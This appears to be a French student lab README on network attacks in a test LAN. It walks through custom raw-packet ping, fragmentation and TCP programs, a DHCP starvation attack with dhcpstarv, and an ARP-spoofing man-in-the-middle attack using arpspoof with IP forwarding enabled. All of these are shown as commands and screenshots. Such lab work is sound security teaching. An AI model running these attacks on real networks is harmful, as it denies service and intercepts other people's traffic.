# tp2-cs
# Implémentation d’attaques 
## my_ping.c
générer un paquet IP echo
```cpp
#cc -c my_ping.c  pour compiler
#cc my_ping.c –o myping  pour générer l’exécutable
#./myping 192.168.1.1 192.168.1.2 500
```
on utilise WireShark pour observer le résultat
![Capture d’écran 2021-12-15 171321](https://user-images.githubusercontent.com/85891554/148665145-56037a0f-bb84-4eee-8b6e-a0748db8c4a5.png)
## pingsur2frag.c
faire un ping avec une taille de 2000 octets sur le lien ethernet
```cpp
#cc -c pingfragments.c  pour compiler
#cc pingfragments.c –o pf  pour générer l’exécutable
#./pf 192.168.1.1 192.168.1.2 2000
```
on utilise WireShark pour observer les différents champs des fragments IP

![Capture d’écran 2021-12-15 223506](https://user-images.githubusercontent.com/85891554/148665162-ecd0f98a-ac07-407d-9c88-d8e7cc702886.png)

## pingfragments.c
compiler et générer l’exécutable
```cpp
#cc -c pingsur2frag.c  pour compiler
#cc pingsur2frag.c –o psf  pour générer l’exécutable
#./psf 192.168.1.1 192.168.1.2 2000
```
observer le resultat 

![Capture d’écran 2021-12-15 223124](https://user-images.githubusercontent.com/85891554/148665177-ff62961a-6ffc-4309-9684-715f2faa3b0e.png)

## demandeconntcp.c
compiler et générer l’exécutable
```cpp
#cc -c demandeconntcp.c  pour compiler
#cc demandeconntcp.c –o dct  pour générer l’exécutable
#./dct 192.168.1.1 192.168.1.2 2000
```
resultat : 

![Capture d’écran 2021-12-15 224322](https://user-images.githubusercontent.com/85891554/148665179-df29fd77-6cdb-482d-a5d2-62764d10ed86.png)

# Test de quelques outils d’attaques2
## DHCP starvation

L’attaquant inonde le serveur DHCP avec des messages DHCPREQUEST afin de réserver toutes les adresses IP disponibles sur le serveur DHCP. L’attaquant doit utiliser une nouvelle adresse MAC pour chaque requête 

## Manipulation :
```cpp
#tar –xvf dhcpstarv-0.2.1.tar.gz
```
![Capture d’écran 2021-12-20 143228 (2)](https://user-images.githubusercontent.com/85891554/148682658-4aa374db-60dd-4e24-af09-faf6207a4876.png)
```cpp
#cd dhcpstarv-0.2.1
#./configure
```
![Capture d’écran 2021-12-30 131121](https://user-images.githubusercontent.com/85891554/148682702-642c7f90-0ccf-4d79-bdc7-473fa0c3085f.png)
```cpp
#make
```
![Capture d’écran 2022-01-09 134601](https://user-images.githubusercontent.com/85891554/148682745-d222fb6c-a63f-479c-b578-031b1a8c1277.png)
```cpp
#make install 
```
![Capture d’écran 2022-01-09 134631](https://user-images.githubusercontent.com/85891554/148682750-00da8427-69b5-4046-ade8-6229e73eaa12.png)

Sur une autre machine, on a configurer le serveur DHCP
_ configuration du dhcp _

![Capture d’écran 2022-01-09 135330](https://user-images.githubusercontent.com/85891554/148683028-cbb5c56d-1a0e-49c3-9c7d-2fda018eac72.png)
on lance l attaque
```cpp
#sudo dhcpstarv -i eth0
```
![WhatsApp Image 2022-01-09 at 1 34 42 PM](https://user-images.githubusercontent.com/85891554/148684372-426ee539-375c-431b-9caa-86e8efd28704.jpeg)
on observe sur WireShark l'envoie des demandes dhcp (dhcp discover)

![Capture d’écran 2022-01-09 135533](https://user-images.githubusercontent.com/85891554/148683036-7fe8905c-ab02-4d9f-8370-9c0ecd4f64a5.png)

l'assignment des adresses ip

![Capture d’écran 2022-01-09 135433](https://user-images.githubusercontent.com/85891554/148683039-c7dfe30d-00f1-4ff3-ad4b-b6bf9d416c74.png)

# Attaque “Man In The Middle” basée sur l'attaque “ARP spoofing”

Pour réaliser cette attaque, nous avons besoin de trois nœuds connectés à un switch (cas réel ou sur 
GNS3) ou à un point d'accès sans fil. Le nœud attaquant sera la machine sur laquelle est installé le 
système d'exploitation « Kali Linux »

> les tables arp avant l'attaque 
![WhatsApp Image 2022-01-09 at 1 34 41 PM (1)](https://user-images.githubusercontent.com/85891554/148683986-43cd377d-b2d6-4ffa-9faa-92c455682e79.jpeg)
## Etape 1 : activer le routage dans le nœud attaquant (Kali Linux)
Tester si le routage est activé en utilisant la commande sysctl ou en cherchant la valeur de ip_forward
dans /proc/sys/ipv4

```cpp
Root# sysctl net.ipv4.ip_forward
net.ipv4.ip_forward = 0
```
Activer le routage :
 ```cpp
 root# sysctl -w net.ipv4.ip_forward=1
 ```
 ![WhatsApp Image 2022-01-09 at 1 34 40 PM](https://user-images.githubusercontent.com/85891554/148683977-f164ced7-6431-496b-b188-84eca5fa7282.jpeg)
 ## Etape 2 : empoisonner les tables ARP des nœuds victimes
 Lancer une communication entre les deux nœuds légtimes (exemple : ping) puis afficher le contenu de 
leur table arp (arp -a). Exécuter, ensuite, l'attaque arpspoof.

```cpp
root#arpspoof -i eth0 -t 192.168.1.3 192.168.1.4
root#arpspoof -i eth0 -t 192.168.1.4 192.168.1.3
```
![WhatsApp Image 2022-01-09 at 1 34 39 PM](https://user-images.githubusercontent.com/85891554/148683990-821599f6-b064-40c2-aa23-ed6c57d0dc78.jpeg)
on utilise Wireshark pour afficher le trafic capturé par l'attaquant
```cpp
root#wireshark
```
![WhatsApp Image 2022-01-09 at 1 34 41 PM](https://user-images.githubusercontent.com/85891554/148683982-89957d90-bcec-4a83-b30d-ee870fa679ca.jpeg)
les tables arp apres l'attaque 

![WhatsApp Image 2022-01-09 at 1 34 41 PM (2)](https://user-images.githubusercontent.com/85891554/148684361-d9e26b60-781f-406c-b538-43345a2a8517.jpeg)

